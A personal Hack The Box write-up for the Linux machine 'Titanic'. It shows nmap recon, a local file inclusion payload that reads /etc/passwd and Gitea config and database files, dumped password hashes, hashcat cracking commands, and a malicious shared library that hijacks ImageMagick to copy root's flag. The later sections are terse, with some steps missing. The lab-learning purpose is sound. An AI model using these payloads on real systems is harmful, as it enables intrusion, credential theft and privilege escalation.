---
title: "HTB Lab | Linux - Titanic"
date: 2025-06-25T23:15:00+07:00
draft: false
tags: ["Linux", "HTB", "HTB Machines", "Web", "Hashcat", "Local File Inclusion", "ImageMagick"]
categories: ["CTF Writeups"]
summary: "How I solved Hack The Box's vulnerable machine \"Titanic\"."
---
[![htb-titanic-1.png](htb-titanic-1.png#center)](https://app.hackthebox.com/machines/648)

# Reconnaissance

Start the machine, the IP given is `10.10.11.55`. We begin by performing an nmap scan on it, revealing 2 open ports:
```
$ nmap -sV 10.10.11.55
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 15:29 EDT
Nmap scan report for titanic.htb (10.10.11.55)
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds
```
When visiting `http://10.10.11.55`, it will redirect you to `http://titanic.htb`. Here, add `10.10.11.55 titanic.htb` to your `/etc/hosts` file - this resolves the IP as `titanic.htb` automatically.

Exploring the website, we notice there is a form when clicking on "Book Your Trip". 

![htb-titanic-2.png](htb-titanic-2.png#center)

Filling in garbage information and submit, a JSON file is downloaded. Viewing it shows the information that we just inputted. My initial suspicision was a vulnerability in the actual input fields, but this yields no result. 

# Web Exploitation
I turn to using Burp Suite to intercept the requests upon clicking 'Submit', revealing a `POST http://titanic.htb/book` and `GET http://titanic.htb/download?ticket=6a516344-0c5b-4936-a025-c364b30565e8.json`.

```
GET /download?ticket=6a516344-0c5b-4936-a025-c364b30565e8.json HTTP/1.1
Host: titanic.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titanic.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Notice that the downloaded file is explicitly shown in the URL. Send this request over to Burp Suite's Repeater, and test for [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) by replacing the request as `/download?ticket=/etc/passwd`.

![htb-titanic-3.png](htb-titanic-3.png#center)

As shown, this was successful in revealing the content of `/etc/passwd`. If you are aware or just through pure intuition that this file is for storing user accounts information, you can naively obtain the user flag by finding the user account `developer` and use LFI `/home/developer/user.txt` to output its content. However, in a real attack, it's likely certain we do not know the exact file name or directory of what we are searching for.

# Gaining Access
## Gitea
This part is where I had a much different approach from HTB's official write-up since I did the box while it was still active. The intended solution was to perform **vHost fuzzing** using `gobuster`, whereas I kept inspecting common files using LFI until I stumble upon `/etc/hosts`. Both solutions would lead to the discovery of `dev.titanic.htb` vHost. Similarly, add it to your `/etc/hosts` file with `10.10.11.55`. 

Visiting it in the browser, we find a self-hosted Gitea instance. Clicking on the 'Explore' tab, we find 2 repositories `docker-config` and `flask-app`.

![htb-titanic-4.png](htb-titanic-4.png#center)

Initially, I checked out `docker-config/mysql/docker-compose.yml` which gave me a MySQL root password. Despite being a great find, there were no open MySQL ports from doing another nmap scan, so I could not continue. However, viewing `docker-config/gitea/docker-compose.yml`, we find the path format for the Gitea instance is `/home/developer/gitea/data:/data`.

![htb-titanic-5.png](htb-titanic-5.png#center)

Here, the official write-up for HTB had a better and more consistent approach by setting up the actual Docker instance and searching the Gitea directory structure from there. I had a different approach which involved some digging and a bit of luck, in which I read the official documentation from Gitea on [its configuration](https://docs.gitea.com/administration/config-cheat-sheet). Knowing Gitea typically place its configuration at `/etc/gitea/conf/app.ini` and from the path format specified in the previous step, I deducted that the path on this system would be `/home/developer/gitea/data/gitea/app.ini`. Sure enough, when trying LFI, I am able to obtain its content. Below are the 2 pieces of information that will be needed next:

![htb-titanic-6.png](htb-titanic-6.png#center)

Download the database file `/home/developer/gitea/data/gitea/gitea.db`. Do `SELECT name,passwd,salt,passwd_hash_algo FROM user` and we can find the username, password hash, salt & their hashing algorithm. Referring back to `app.ini`, we can confirm that the algorithm is `PBKDF2`.
```
sqlite> select name,passwd,salt,passwd_hash_algo from user;
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b|pbkdf2$50000$50
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34|pbkdf2$50000$50
```

## Hash Cracking
Browsing through [Gitea's documentation](https://docs.gitea.com/administration/config-cheat-sheet#security-security), 

```sh
echo -n "2d149e5fbd1b20cf31db3e3c6a28fc9b" | xxd -r -p | base64
```

```sh
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt 
```

```sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
	system("cp /root/root.txt root.txt; chmod 777 root.txt");
    exit(0);
}
EOF
```

# Learned Skills
- Practical CVE research and hands-on exploitation of ImageMagick vulnerability on actual Linux web server.
